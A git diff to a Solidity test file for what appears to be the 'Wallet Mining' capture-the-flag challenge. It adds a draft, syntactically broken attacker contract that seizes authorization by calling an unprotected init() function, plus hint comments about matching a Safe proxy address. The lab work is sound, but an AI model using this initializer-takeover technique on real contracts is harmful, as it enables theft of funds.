@@ -157,7 +157,7 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+
     }
 
     /**
@@ -189,4 +189,37 @@ contract WalletMiningChallenge is Test {
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
     }
+}
+
+
+
+
+
+
+contract Attacker() {
+
+    function getAuthorized() public {
+        //draft
+                                                                                                                                                                
+        // needsInit (slot 0) == upgrader address == non-zero                                                                                                   
+        // so init() can be called by anyone                                                                                                                    
+                                                                                                                                                                
+        address[] memory wards = new address[](1);                                                                                                              
+        address[] memory aims = new address[](1);
+                                                                                                                                                                
+        wards[0] = player;                  // authorize yourself
+        aims[0] = USER_DEPOSIT_ADDRESS;     // for this target address                                                                                          
+                                                                                                                                                                
+        AuthorizerUpgradeable(authorizer).init(wards, aims);      
+    }
+//After this, can(player, USER_DEPOSIT_ADDRESS) returns true, so drop() won't return false on you.                                                        
+                                                                                                                                                          
+//   Next question: drop() also does this (WalletDeployer.sol:53):                                                                                           
+//   if (address(cook.createProxyWithNonce(cpy, wat, num)) != aim) {
+//       return false;                                                                                                                                       
+//   }                                                                                                                                                       
+   
+  //It deploys a Safe and checks the deployed address equals USER_DEPOSIT_ADDRESS. What do you need to figure out to make that check pass?   
+
+
 }
